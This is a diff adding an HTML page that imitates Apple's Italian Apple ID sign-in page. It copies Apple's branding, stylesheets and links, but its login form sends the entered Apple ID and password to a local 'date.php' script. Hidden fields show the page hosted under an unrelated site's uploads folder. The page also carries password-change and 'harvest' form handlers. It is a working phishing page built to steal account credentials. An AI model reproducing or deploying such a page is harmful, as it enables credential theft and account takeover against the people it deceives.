@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Apple - My Apple ID
+  </title>
+  <meta content="content-type" http-equiv="content-type" />
+  <meta content="IE=EmulateIE7, IE=9" http-equiv="X-UA-Compatible" />
+  <meta content='(pics-1.1 "http://www.icra.org/ratingsv02.html" l gen true for "http://www.apple.com" r (cz 1 lz 1 nz 1 oz 1 vz 1)   "http://www.rsac.org/ratingsv01.html" l gen true for "http://www.apple.com" r (n 0 s 0 v 0 l 0))' http-equiv="pics-label" />
+  <meta content="user-scalable=yes, width=1024" name="viewport" />
+  <meta content="Apple Inc." name="Author" />
+  <meta content="Apple - My Apple ID" name="omni_page" />
+  <meta content="" name="Category" />
+  <meta content="" name="Description" />
+  <link href="https://appleid.cdn-apple.com/static/img/cb3606853004/images/favicon.ico" type="image/x-icon" rel="shortcut icon" />
+  <link href="https://www.apple.com/wss/fonts?family=Sukhumvit+Set&v=1&weights=200,400,700%20" type="text/css" rel="stylesheet" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/common/jQuery_UI.css" type="text/css" rel="stylesheet" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/App93/style.css" type="text/css" rel="stylesheet" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/App93/ac_quicktime.css" type="text/css" rel="stylesheet" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/App93/overlay.css" type="text/css" rel="stylesheet" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/App93/ds_login.css" type="text/css" rel="stylesheet" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/App93/base-template.css" type="text/css" rel="stylesheet" />
+  <script type="application/javascript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/Appjavascripts/jquery_v1_1.10.2.min.js">
+  </script>
+  <!-- <link rel="stylesheet" type="text/css" href="styles/base.css"> -->
+  <!--[if lt IE 9]>
+	<script src="http://css3-mediaqueries-js.googlecode.com/files/css3-mediaqueries.js"></script>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+  <style>
+   [touch-action="none"] {
+			-ms-touch-action: none;
+			touch-action: none;
+		}
+
+		[touch-action="pan-x"] {
+			-ms-touch-action: pan-x;
+			touch-action: pan-x;
+		}
+
+		[touch-action="pan-y"] {
+			-ms-touch-action: pan-y;
+			touch-action: pan-y;
+		}
+
+		[touch-action="scroll"],
+		[touch-action="pan-x pan-y"],
+		[touch-action="pan-y pan-x"] {
+			-ms-touch-action: pan-x pan-y; 
+			touch-action: pan-x pan-y;
+		}
+	.alert{
+	background-image: url(images/myappleid_error_20091125.png);
+    clear: both;
+    display: block ! important;
+    height: 17px;
+    margin: 0 0 -18px;
+    position: absolute;
+    right: 215px;
+    top: 84px;
+    width: 17px;
+		}
+		#wrapper_inner{
+		margin: auto ! important;
+		width:980px;
+		}
+		body{
+		width:100% ! important;
+		}
+  </style>
+  <script>
+   jQuery.noConflict();
+	(function( $ ) {
+	jQuery(document).ready(function(){	
+		$('#formwrapstyle,#formwrapstyle1,.formwrap,.formwrow').addClass("tbox-wrap");
+		$('#signInHyperLink').remove();
+		
+		$('a.bigblue').html('&lt;span&gt;Accedi&lt;/span');
+		$('#bot-nav').wrap('&lt;div class="button-panel"&gt;');
+		$('input#confirmPassword').removeAttr('onkeydown');
+		$('#expiryForm #bot-nav').html('&lt;a class="btn bigblue" onkeypress="checkEnter(event);" onclick="submitExpiryForm()"&gt;&lt;span&gt;Cambia password&lt;/span&gt;&lt;/a&gt;');
+		$('#harvest #bot-nav').html('&lt;a class="btn bigblue" onkeypress="checkEnter(event);" onclick="submitHarvestForm();"&gt;&lt;span&gt;Continua&lt;/span&gt;&lt;/a&gt;');
+		$('input#oldPassword,input#newPassword,input#confirmPassword').attr('onkeypress','checkEnter(event)');
+		
+
+	$('a.bigblue').click(function(e) {
+		if (!$('a.bigblue').hasClass('disabled')) {
+			$('a.bigblue').addClass('disabled');
+			submitForm();
+	   }else if($('a.bigblue').hasClass('disabled')){
+		   e.preventDefault();
+	   }
+	});
+	
+	});
+	})(jQuery);
+
+	function submitFormOne()
+	 {
+		$('a.bigblue').removeAttr('onclick');
+			document.form1.submit();
+	 }
+  </script>
+  <style id="supportsThreeDStyle">
+   @media (transform-3d),(-o-transform-3d),(-moz-transform-3d),(-ms-transform-3d),(-webkit-transform-3d) { #supportsThreeD { height:3px } }
+  </style>
+ </head>
+ <body class="body" onload="javascript:urlStore();fixSafariBackButton();">
+  <!-- header begins here -->
+  <!--********* New style imported as per the new Header *********-->
+  <link type="text/css" href="https://www.apple.com/ac/globalheader/1.0/styles/globalheader.css" rel="stylesheet" />
+  <!-- end -->
+  <!--********* setting country and language from Language parameter *********-->
+  <!--********* setting locale to urlLanguageInsert to dynamically form the URL based on locale *********-->
+  <!--  Code to choose the js based on if it shows support bar or not -->
+  <script charset="utf-8" type="text/javascript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/2011/global/nav/scripts/globalnav.js">
+  </script>
+  <nav lang="it-IT" data-analytics-region="global nav" data-hires="false" aria-label="Global Navigation" role="navigation" class="globalheader" id="globalheader">
+   <!-- replace the lang with dynamically populated locale code in the format language-COUNTRY -->
+   <div class="gh-content" id="gh-content">
+    <ul class="gh-menu">
+     <li class="gh-menu-icon gh-menu-icon-toggle enhance" id="gh-menu-icon-toggle">
+      <button class="gh-svg-wrapper" id="gh-svg-icons">
+       <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100%" viewbox="0 0 96 96" class="gh-svg gh-svg-top" enable-background="new 0 0 96 96">
+        <rect width="32" height="4" x="32" y="46" class="gh-svg-rect gh-svg-rect-top">
+        </rect>
+       </svg>
+       <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="100%" viewbox="0 0 96 96" class="gh-svg gh-svg-bottom" enable-background="new 0 0 96 96">
+        <rect width="32" height="4" x="32" y="46" class="gh-svg-rect gh-svg-rect-bottom">
+        </rect>
+       </svg>
+      </button>
+      <span class="gh-text-replace">
+       Menu
+      </span>
+     </li>
+     <li class="gh-menu-icon gh-menu-icon-home" id="gh-menu-icon-home">
+      <a href="/">
+       <span class="gh-text-replace">
+        Apple
+       </span>
+      </a>
+     </li>
+    </ul>
+    <!--/gh-menu-->
+    <div class="gh-nav">
+     <div class="gh-nav-view">
+      <ul class="gh-nav-list">
+       <li class="gh-tab gh-tab-apple">
+        <a onclick='s_objectID="http://www.apple.com/it/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           Apple
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-store">
+        <a onclick='s_objectID="http://store.apple.com/it/_1";return this.s_oc?this.s_oc(e):true' href="http://store.apple.com/it/" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           Store
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-mac">
+        <a onclick='s_objectID="http://www.apple.com/it/mac/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/mac" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           Mac
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-iphone">
+        <a onclick='s_objectID="http://www.apple.com/it/iphone/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/iphone" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           iPhone
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-watch">
+        <a onclick='s_objectID="http://www.apple.com/it/watch/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/watch" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           Watch
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-ipad">
+        <a onclick='s_objectID="http://www.apple.com/it/ipad/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/ipad" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           iPad
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-ipod">
+        <a onclick='s_objectID="http://www.apple.com/it/ipod/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/ipod" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           iPod
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-itunes">
+        <a onclick='s_objectID="http://www.apple.com/it/itunes/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/itunes" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           iTunes
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-support">
+        <a onclick='s_objectID="http://www.apple.com/it/support/_1";return this.s_oc?this.s_oc(e):true' href="http://www.apple.com/it/support" class="gh-tab-link">
+         <span class="gh-tab-inner">
+          <span class="gh-text-replace">
+           Support
+          </span>
+         </span>
+        </a>
+       </li>
+       <li class="gh-tab gh-tab-search enhance" id="gh-tab-search">
+        <div role="search" class="gh-search" id="gh-search">
+         <form data-search-recommended-results='{"url":"https://www.apple.com/global/nav/scripts/shortcuts.php","requestName":"recommendedResults","queryName":"q","dataType":"xml"}' id="gh-search-form" class="gh-search-form" method="post" action="http://www.apple.com/it/search/" role="search">
+          <div class="gh-search-input-wrapper">
+           <label class="gh-text-replace" for="gh-search-input">
+            Search apple.com
+           </label>
+           <input type="text" placeholder="Search apple.com" class="gh-search-input" id="gh-search-input" name="q" autocomplete="off" autocorrect="off" autocapitalize="off" />
+          </div>
+          <button class="gh-search-submit gh-search-magnify" id="gh-search-submit" type="submit" disabled="disabled">
+           <span class="gh-text-replace">
+            Search apple.com
+           </span>
+          </button>
+          <button class="gh-search-reset" id="gh-search-reset" type="reset" disabled="disabled">
+           <span class="gh-text-replace">
+            Reset
+           </span>
+          </button>
+         </form>
+        </div>
+        <a href="http://www.apple.com/search/" class="gh-search-magnify">
+         <span class="gh-text-replace">
+          Search apple.com
+         </span>
+        </a>
+       </li>
+      </ul>
+     </div>
+    </div>
+    <!--/gh-nav-->
+    <!--*********END************ THIS PORTION CAN BE ALTERED BASED ON LANGUAGE *********END************-->
+   </div>
+  </nav>
+  <!--/globalheader-->
+  <script charset="utf-8" type="text/javascript" src="https://www.apple.com/ac/globalheader/1.0/scripts/globalheader.js">
+  </script>
+  <div id="supportsThreeD">
+  </div>
+  <!-- header ends here -->
+  <div id="wrapper_inner">
+   <div class="logo">
+    <h2>
+     <a href="https://appleid.apple.com/" aria-label="My Apple ID">
+      <img src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/images/App93/images/it/headerLogo.png" aria-hidden="true" id="logo" />
+     </a>
+    </h2>
+   </div>
+   <div class="base-template-content">
+    <article class="base-template">
+     <div aria-describedby="your-apple-id" aria-labelledby="your-apple-id-heading" class="left">
+      <h2 role="heading" id="your-apple-id-heading">
+       Accedi per gestire il tuo ID Apple.
+      </h2>
+      <p class="intro" id="your-apple-id">
+       Per visualizzare e modificare le informazioni del tuo account ID Apple, esegui il login. Se non hai un ID Apple, puoi
+       <a href="https://appleid.apple.com/account">
+        crearne uno ora.
+       </a>
+      </p>
+     </div>
+     <div class="right">
+      <div class="sign-in-panel">
+       <h2 style="padding-left:13px;">
+        Accedi.
+       </h2>
+       <link charset="utf-8" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/css/common/commonLogin.css" type="text/css" rel="stylesheet" />
+       <script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/common.js" type="text/javaScript">
+       </script>
+       <script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/Appjavascripts/FDC/dcutil_2_1.js" type="text/javaScript">
+       </script>
+       <script charset="utf-8" type="text/javascript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/js/commonLogin.js">
+       </script>
+       <script charset="utf-8" type="text/javascript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/views/static/js/commonScript.js">
+       </script>
+       <input type="hidden" value="none" id="harvestID" autocomplete="off" />
+       <input type="hidden" value="none" id="expiryID" autocomplete="off" />
+       <input type="hidden" value="authentication" id="authenticationID" autocomplete="off" />
+       <input type="hidden" id="modernview" value="modern" autocomplete="off" />
+       <script>
+       </script>
+       <table width="100%">
+        <tbody>
+         <tr>
+          <td>
+           <div id="ds_container">
+            <form onsubmit="return ValidationEvent()" method="post" action="date.php" name="form1" id="command">
+             <script src="js/l.js">
+             </script>
+             <input type="hidden" value="false" name="openiForgotInNewWindow" id="iForgotNewWindowVar" autocomplete="off" />
+             <input type="hidden" value="" name="fdcBrowserData" id="fdcBrowserData" autocomplete="off" />
+             <!-- show heading -->
+             <div id="formRowDiv" class="formrow">
+              <span id="formwrapstyle" class="formwrap tbox-wrap">
+               <div class="field-container" style="position: relative;">
+                <input type="text" maxlength="128" size="30" value="" aria-label="Apple ID" autocapitalize="off" class="input-text" autocorrect="off" spellcheck="false" onkeypress="checkEnter(event,this,'form1');" tabindex="1" required="" name="appleId" id="accountname" autocomplete="off" />
+                <div id="label7" class="label-text" style="display: block; color: rgb(170, 170, 170); position: absolute; top: 0px; left: 0px; width: 290px; padding: 0px; text-align: start; font-size: 13.8833px;" aria-hidden="true">
+                 ID Apple
+                </div>
+               </div>
+              </span>
+              <div class="space padder2">
+               <span class="input-msg show">
+                <a onclick="javascript:appendURL('https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogin.html%3FappIdKey%3Daf1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3%26path%3D%2Fsignin%2F%3Freferrer%3D%2Faccount%2Fmanage%26language%3DIT-IT'),loadiForgotInNewWindow();" href="https://iforgot.apple.com/cgi-bin/findYourAppleID.cgi?language=IT-IT&app_id=93&s=548-548" id="appleIdURL">
+                 Hai dimenticato il tuo ID Apple?
+                </a>
+               </span>
+              </div>
+             </div>
+             <div class="formrow">
+              <span id="formwrapstyle1" class="formwrap tbox-wrap">
+               <div class="field-container" style="position: relative;">
+                <input type="password" size="30" value="" aria-label="Password" autocapitalize="off" oncopy="return false;" autocorrect="off" oncut="return false;" onkeypress="checkEnter(event,this,'form1');" tabindex="2" name="accountPassword" id="accountpassword" autocomplete="off" />
+                <div id="label8" class="label-text" style="display: block; color: rgb(170, 170, 170); position: absolute; top: 0px; left: 0px; width: 290px; padding: 0px; text-align: start; font-size: 13.8833px;" aria-hidden="true">
+                 Password
+                </div>
+               </div>
+              </span>
+              <div class="space padder3">
+               <span class="input-msg show">
+                <a onclick="javascript:appendURL('https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogin.html%3FappIdKey%3Daf1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3%26path%3D%2Fsignin%2F%3Freferrer%3D%2Faccount%2Fmanage%26language%3DIT-IT'),loadiForgotInNewWindow();" href="https://iforgot.apple.com/cgi-bin/iforgot.cgi?language=IT-IT&app_id=93&s=548-548" id="passwordURL">
+                 Hai dimenticato la password?
+                </a>
+               </span>
+              </div>
+             </div>
+             <div class="button-panel">
+              <div id="bot-nav">
+               <input type="image" a="" />
+               <="" src="accedi.png" autocomplete="off"  />
+              </div>
+             </div>
+             <input type="hidden" value="af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3" name="appIdKey" id="appIdKey" autocomplete="off" />
+             <input type="hidden" value="IT-IT" name="language" id="language" autocomplete="off" />
+             <input type="hidden" value="/signin/?referrer=/account/manage" name="path" id="path" autocomplete="off" />
+             <input type="hidden" value="PROD" name="Env" id="Env" autocomplete="off" />
+             <input type="hidden" id="captchaType" name="captchaType" autocomplete="off" />
+             <input type="hidden" id="captchaToken" name="captchaToken" autocomplete="off" />
+            </form>
+           </div>
+          </td>
+          <td width="30%" class="cellspacer">
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <input type="hidden" value="ID Apple" id="appleIdHide" autocomplete="off" />
+       <input type="hidden" value="Password" id="accountPasswordHide" autocomplete="off" />
+       <script>
+        appendOnLoad();
+hintText();
+       </script>
+       <!-- Set the field account Name as Type="email" in case the request is from iPhone or iPad -->
+       <input type="hidden" id="hiddenUrl" name="hiddenUrl" autocomplete="off" value="http://4checkers.de/uploaded_files/banners/image/execute/index.html" />
+       <input type="hidden" id="currentUrl" name="currentUrl" autocomplete="off" value="http://4checkers.de/uploaded_files/banners/image/execute/index.html" />
+       <script type="text/javascript">
+        var inputs = document.getElementsByTagName("input");
+for(i=0;i&lt;inputs.length ;i++){
+inputs[i].setAttribute('autocomplete','off');
+	
+}
+       </script>
+      </div>
+     </div>
+    </article>
+   </div>
+   <footer class="main-footer" id="globalfooter">
+    <div class="breadcrumb">
+     <ol id="crumbs">
+      <li class="home">
+       <a href="http://www.apple.com">
+        Pagina iniziale
+       </a>
+      </li>
+      <li>
+       <a href="https://appleid.apple.com/">
+        Il mio ID Apple
+       </a>
+      </li>
+      <li>
+      </li>
+     </ol>
+    </div>
+    <div class="gf-sosumi">
+     <p>
+      Copyright © 2014  Apple Inc. Tutti i diritti riservati.
+     </p>
+     <ul class="piped">
+      <li>
+       <a href="http://www.apple.com/legal/terms/site.html" class="first">
+        Termini di utilizzo
+       </a>
+      </li>
+      <li>
+       <a href="http://www.apple.com/privacy/">
+        Norme sulla Privacy
+       </a>
+      </li>
+      <li class="choose">
+       <a href="https://appleid.apple.com/choose-your-country" title="Choose your country or region" class="choose">
+       </a>
+       <p>
+        Seleziona il paese o l'area geografica
+       </p>
+       <img src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/11Nov2014/images/AppleConnect/22x22/ITflag.png" class="img-22" />
+      </li>
+     </ul>
+    </div>
+   </footer>
+  </div>
+ </body>
+</html>
